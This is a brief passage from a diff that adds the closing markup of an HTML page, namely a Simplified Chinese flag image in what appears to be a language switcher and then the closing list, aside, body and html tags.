+            <img src="images/cn.svg" width="30" height="20" role="presentation" alt="中文 (简体) flag" class="wg-flag">
+          </a>
+        </li>
+      </ul>
+    </aside>
+  </div>
+
+
+</body></html>
